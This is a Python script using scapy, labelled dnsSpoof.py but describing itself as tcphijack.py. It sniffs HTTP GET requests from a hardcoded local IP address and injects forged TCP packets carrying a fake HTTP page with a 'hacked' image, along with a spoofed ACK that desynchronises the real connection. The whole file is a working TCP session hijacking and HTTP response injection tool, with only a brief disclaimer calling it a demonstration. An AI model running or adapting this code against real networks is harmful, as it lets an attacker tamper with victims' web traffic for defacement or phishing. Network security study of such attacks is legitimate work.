#!/usr/bin/env python
# This code is strictly for demonstration purposes.
# If used in any other way or for any other purposes. In no way am I responsible
# for your actions or any damage which may occur as a result of its usage
# dnsSpoof.py
# Author: Nik Alleyne - nikalleyne at gmail dot com
# http://securitynik.blogspot.com

from sys import argv, exit
from scapy.all import *
from random import randint
import time

def usage():
    print("[*]Usage: python tcphijack.py [network interface]")
    
def scan(packet):
    return
    
def getTrueLength(payload):
    hex = str(payload).encode("hex")
    length = 0
    for b in range(0,len(hex)):
        if b%2 == 0:
            byte = hex[b] + hex[b+1]
            if byte != "00":
                length = length + 1
    return length
                
def main():
    global host
    print "Beginning to sniff on " + sys.argv[1]
    dict = {}
    IPSTOHIJACK = ["192.168.36.134"]
    headerLength = 20
    while 1:
        packet = sniff(iface=argv[1], prn=scan,lfilter=lambda p: "GET" in str(p), filter="tcp port 80", count=1)[0]
        if packet.haslayer(TCP):
            if packet.haslayer(IP):
                IPsrc = packet.getlayer(IP).src
                IPdst = packet.getlayer(IP).dst
                if (IPsrc in IPSTOHIJACK):
                    randomPort = randint(1,65535)
                    tcpPacket = packet.getlayer(TCP)
                    srcPort = tcpPacket.sport
                    dstPort = tcpPacket.dport
                    seq = tcpPacket.seq
                    ack = tcpPacket.ack
                    size = getTrueLength(tcpPacket.payload)
                    payload = "HTTP/1.1 200 OK\r\nContent-Length: 54776\r\nContent-Type: text/html; charset=utf-8\r\n\r\n\r\n<html><head></head><body><img src='https://www.gohacking.com/wp-content/uploads/2013/11/hacked133-735x400.jpg'></body></html> <!--"
                    #print str(IPsrc)+" --> " + str(IPdst) + ",SEQ: " + str(seq) + ",ACK: " + str(ack) + " with packet size of " + str(size) + " : " +str(tcpPacket.payload).encode("hex")
                    spoofedPkt = Ether()/IP(src=IPdst,dst=IPsrc)/TCP(sport=dstPort,dport=srcPort,seq=ack,ack=seq+size,flags='A')/payload
                    spoofedPkt2 = Ether()/IP(src=IPsrc,dst=IPdst)/TCP(sport=srcPort,dport=dstPort,seq=ack,ack=seq+size+len(payload),flags='A')
                    #time.sleep(1)
                    sendp(spoofedPkt,iface=sys.argv[1])
                    sendp(spoofedPkt2,iface=sys.argv[1])

if len(sys.argv) < 2:
    usage()
    exit(0)

if __name__ == '__main__':
    main()
